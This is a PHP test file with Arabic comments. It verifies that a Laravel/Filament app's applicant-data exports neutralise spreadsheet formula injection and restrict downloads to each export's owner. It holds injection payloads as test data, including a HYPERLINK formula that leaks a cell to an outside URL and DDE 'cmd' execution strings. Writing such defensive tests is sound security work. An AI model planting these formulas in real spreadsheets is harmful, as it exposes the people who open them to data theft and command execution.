<?php

use App\Enums\RoleName;
use App\Filament\Exports\ProgramRegistrationExporter;
use App\Filament\Exports\ServiceRequestExporter;
use App\Filament\Exports\SubmissionExporter;
use App\Models\CompetitionSubmission;
use App\Models\Opening;
use App\Models\Program;
use App\Models\ProgramRegistration;
use App\Models\ServiceRequest;
use App\Models\User;
use Filament\Actions\Exports\Enums\ExportFormat;
use Filament\Actions\Exports\Exporter;
use Filament\Actions\Exports\Models\Export;
use Illuminate\Database\Eloquent\Model;
use Symfony\Component\HttpKernel\Exception\HttpException;

/*
| حقن الصيغ في كل تصدير (الاختبار الأمني 0.14.0): كل خلية نصية من المتقدم أو الموظف (الاسم، والبريد، والمسؤول، وعنوان
| الفرصة أو البرنامج، والإجابات) تخرج نصاً لا صيغة، ولو سبقت علامةَ الصيغة فراغات. وكان «المسؤول» في تصدير الطلبات بلا
| حماية: موظف يسمّي نفسه =WEBSERVICE(...) فتُنفَّذ على بيانات المتقدمين في ورقة من يصدّرها.
*/

const FORMULAS = ['=HYPERLINK("https://x/?"&C2,"x")', '+cmd|"/c calc"!A1', '-2+3+cmd|x', '@SUM(1)', "\t=1+1", "\r=1+1", "\u{00A0}=1+1", ' =1+1'];

/**
 * صف التصدير كما يكتبه Filament، بكل الأعمدة.
 *
 * @param  class-string<Exporter>  $exporter
 * @return array<string, mixed>
 */
function exportRow(string $exporter, Model $record): array
{
    $columns = collect($exporter::getColumns())->mapWithKeys(fn ($column) => [$column->getName() => $column->getName()])->all();

    // Filament يعيد الصف قائمة بترتيب الأعمدة، فيُسمّى كل عمود باسمه
    return array_combine(array_keys($columns), (new $exporter(new Export(['exporter' => $exporter]), $columns, []))($record));
}

it('writes every text cell of every export as text, never as a formula', function (string $formula) {
    $user = User::factory()->create(['name' => $formula, 'email' => 'x@example.test']);
    $staff = User::factory()->create(['name' => $formula]);
    $request = ServiceRequest::factory()->for(Opening::factory()->state(['title' => $formula]))->for($user)->create([
        'assigned_to' => $staff->id, 'answers' => ['about' => $formula],
    ]);
    $registration = ProgramRegistration::factory()->for(Program::factory()->state(['title' => $formula]))->for($user)->create();
    $submission = CompetitionSubmission::factory()->for($user)->create(['category' => $formula, 'full_name' => $formula]);

    $rows = [
        'requests' => exportRow(ServiceRequestExporter::class, $request->load(['opening', 'user', 'assignee'])),
        'programs' => exportRow(ProgramRegistrationExporter::class, $registration->load(['program', 'user'])),
        'submissions' => exportRow(SubmissionExporter::class, $submission->load('user')),
    ];

    $live = [];
    foreach ($rows as $export => $row) {
        foreach ($row as $column => $value) {
            // التعبير نفسه في safeCell: ولو سبقت العلامةَ فراغاتٌ أو NBSP أو BOM
            if (is_string($value) && preg_match('/^[\s\x{00A0}\x{FEFF}]*[=+\-@\t\r]/u', $value) === 1) {
                $live[] = $export.' '.$column;
            }
        }
    }

    // الحمولة وصلت الخلايا فعلاً (مقتبسة)، لا تصدير فارغ
    expect(collect($rows['requests'])->filter(fn ($value) => is_string($value) && str_starts_with($value, "'"))->count())->toBeGreaterThanOrEqual(3)
        ->and($live)->toBe([]);
})->with(FORMULAS);

// الجوال يُخزَّن «+966…»، فبعلامة + أول الخلية كان سيُقتبس ('+9665…) أو تحسبه برامج الجداول رقماً: بالصيغة المحلية في كل تصدير
it('writes the phone in its local form in every export, not quoted and not as a number', function () {
    $user = User::factory()->create(['phone' => '+966512345678']);

    $phones = [
        exportRow(ServiceRequestExporter::class, ServiceRequest::factory()->for($user)->create()->load(['opening', 'user', 'assignee']))['user.phone'],
        exportRow(ProgramRegistrationExporter::class, ProgramRegistration::factory()->for($user)->create()->load(['program', 'user']))['user.phone'],
        exportRow(SubmissionExporter::class, CompetitionSubmission::factory()->for($user)->create()->load('user'))['user.phone'],
    ];

    expect($phones)->each->toBe('051 234 5678');
});

it('quotes a formula after leading spaces in the exports that use safeCell', function () {
    expect(ServiceRequestExporter::safeCell("\u{00A0}=1+1"))->toBe("'\u{00A0}=1+1")
        ->and(ServiceRequestExporter::safeCell("\u{FEFF} @SUM(1)"))->toStartWith("'")
        ->and(ServiceRequestExporter::safeCell('-'))->toBe("'-")
        ->and(ServiceRequestExporter::safeCell('نص - عادي'))->toBe('نص - عادي');
});

// مسار التنزيل في Filament يقبل ?format=csv لأي تصدير، فكان التصدير المحصور في Excel ينزل CSV أيضاً
it('serves an Excel-only export as Excel alone, never as CSV', function (string $exporter) {
    expect(fn () => $exporter::getDownloader(ExportFormat::Csv))->toThrow(HttpException::class)
        ->and($exporter::getDownloader(ExportFormat::Xlsx))->not->toBeNull();
})->with([ServiceRequestExporter::class, ProgramRegistrationExporter::class]);

it('refuses an export file to anyone but its owner, for every exporter, even with the same permission', function (string $exporter, RoleName $role) {
    $owner = userWithRole($role);
    $export = new Export;
    $export->forceFill(['exporter' => $exporter, 'user_id' => $owner->id, 'file_disk' => 'local', 'file_name' => 'x', 'total_rows' => 1, 'processed_rows' => 1, 'successful_rows' => 1])->save();

    $this->actingAs(userWithRole($role))
        ->get(route('filament.exports.download', ['export' => $export, 'format' => 'xlsx']))
        ->assertForbidden();
})->with([
    'requests' => [ServiceRequestExporter::class, RoleName::Secretary],
    'programs' => [ProgramRegistrationExporter::class, RoleName::ProgramManager],
    'submissions' => [SubmissionExporter::class, RoleName::ProgramManager],
]);
